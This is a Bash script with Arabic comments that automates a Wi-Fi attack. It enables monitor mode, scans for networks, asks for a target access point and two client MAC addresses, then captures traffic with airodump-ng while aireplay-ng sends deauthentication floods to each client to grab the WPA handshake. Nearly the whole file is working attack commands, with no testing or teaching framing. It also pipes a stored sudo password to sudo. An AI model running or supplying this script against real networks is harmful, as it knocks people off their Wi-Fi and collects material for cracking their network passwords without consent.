#!/bin/bash

# تعريف الألوان
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # إعادة اللون إلى الافتراضي

read -s -p "Enter your sudo password: " PASSWORD

echo
# فاصل زخرفي
SEPARATOR="${CYAN}──────────────────────────────────────────${NC}"

echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Change Directory to Other${NC}"
echo -e "$SEPARATOR"
cd /mnt/hdd/HS/
sleep 1

echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Checking USB Devices...${NC}"
echo -e "$SEPARATOR"
lsusb
sleep 2

echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Checking Wireless Configuration...${NC}"
echo -e "$SEPARATOR"
iwconfig
sleep 3

echo -e "$SEPARATOR"
echo -e "${YELLOW}[INFO] Enabling Monitor Mode on wlan0...${NC}"
echo -e "$SEPARATOR"
sudo airmon-ng start wlan0
sleep 2

echo -e "$SEPARATOR"
echo -e "${RED}[WARNING] Killing Conflicting Processes...${NC}"
echo -e "$SEPARATOR"
sudo airmon-ng check kill
sleep 3

echo -e "$SEPARATOR"
echo -e "${WHITE}[INFO] Verifying Wireless Configuration...${NC}"
echo -e "$SEPARATOR"
iwconfig
sleep 3


# إزالة جهاز USB معين
echo -e "$SEPARATOR"
echo "[INFO] Removing USB Device..."
echo -e "$SEPARATOR"
echo "$PASSWORD" | sudo -S bash -c "echo '1' > /sys/bus/usb/devices/1-1/remove"
sleep 3
echo -e "$SEPARATOR"
lsusb
echo -e "$SEPARATOR"
sleep 3

# إلغاء تحميل برنامج تشغيل وحدة تحكم الـ PCI
echo -e "$SEPARATOR"
echo "[INFO] Unbinding PCI Device..."
echo -e "$SEPARATOR"

echo -n "0000:00:0b.0" | sudo tee /sys/bus/pci/drivers/ehci-pci/unbind
sleep 3
echo
echo -e "$SEPARATOR"
lsusb
echo -e "$SEPARATOR"
sleep 3

# إعادة تحميل برنامج تشغيل وحدة تحكم الـ PCI
echo -e "$SEPARATOR"
echo "[INFO] Binding PCI Device..."
echo -e "$SEPARATOR"
echo -n "0000:00:0b.0" | sudo tee /sys/bus/pci/drivers/ehci-pci/bind
sleep 3
echo
echo -e "$SEPARATOR"
lsusb
echo -e "$SEPARATOR"
sleep 15


echo -e "$SEPARATOR"
echo -e "${GREEN}[INFO] Running Airodump-ng for 60 seconds...${NC}"
echo -e "$SEPARATOR"
sudo timeout 1m airodump-ng wlan0 
echo -e "${GREEN}[INFO] Airodump-ng process finished, continuing...${NC}"
sleep 5

echo -e "$SEPARATOR"
read -p "$(echo -e ${BLUE}[INFO] Enter The MAC of Target : ${NC})" bssid
read -p "$(echo -e ${BLUE}[INFO] Enter Channel of Target : ${NC})" channel

echo -e "$SEPARATOR"
echo -e "${CYAN}[INFO] Running targeted Airodump-ng...${NC}"
echo -e "$SEPARATOR"
sudo timeout 20s airodump-ng wlan0 --bssid $bssid --channel $channel 
sleep 5

echo -e "$SEPARATOR"
read -p "$(echo -e ${BLUE}[INFO] Enter The MAC OF Client 1: ${NC})" client1
read -p "$(echo -e ${BLUE}[INFO] Enter The MAC OF Client 2: ${NC})" client2
sleep 4

echo -e "$SEPARATOR"
echo -e "${GREEN}[INFO] Starting aireplay-ng attacks...${NC}"
echo -e "$SEPARATOR"
xterm -geometry 80x24+0+0 -e "echo "$PASSWORD" | sudo -S timeout 1m airodump-ng wlan0 --bssid $bssid --channel $channel --write $bssid --output-format cap,csv; exit;" &
sleep 2
xterm -geometry 80x12+960+0 -e "sleep 5; sudo aireplay-ng -0 30 -a $bssid -c $client1 wlan0; exit;" &
sleep 1
xterm -geometry 80x24+960+540 -e "sleep 20; sudo aireplay-ng -0 30 -a $bssid -c $client2 wlan0; exit;"
sleep 5

wait

echo -e "$SEPARATOR"
echo -e "${YELLOW}[WARNING] Stopping Monitor Mode...${NC}"
echo -e "$SEPARATOR"
sudo airmon-ng stop wlan0
sleep 3

echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Verifying Wireless Configuration...${NC}"
echo -e "$SEPARATOR"
iwconfig
sleep 3

echo -e "$SEPARATOR"
echo -e "${RED}[WARNING] Restarting Network Services...${NC}"
echo -e "$SEPARATOR"
sudo systemctl start wpa_supplicant
sleep 4
sudo systemctl start NetworkManager
sleep 3

echo -e "$SEPARATOR"
echo -e "${GREEN}[INFO] Process Completed Successfully!${NC}"
echo -e "$SEPARATOR"


unset PASSWORD

